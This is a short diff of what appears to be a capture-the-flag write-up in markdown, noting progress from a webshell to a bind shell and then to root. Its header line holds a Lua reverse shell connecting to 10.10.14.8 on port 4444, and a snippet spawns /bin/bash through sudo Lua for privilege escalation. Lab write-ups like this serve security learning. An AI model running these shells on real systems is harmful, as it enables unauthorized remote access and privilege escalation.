@@ -54,6 +54,7 @@ require('socket');require('os');t=socket.tcp();t:connect('10.10.14.8','4444');os
 ```
 * I got webadmin through the other hacker's webshell and then I got sysadmin through a bind shell using the sudo lua code I used the following code  
 
+* I just have getting the root left.
 ```lua
 #\!/usr/local/bin/lua
 os.execute("/bin/bash");
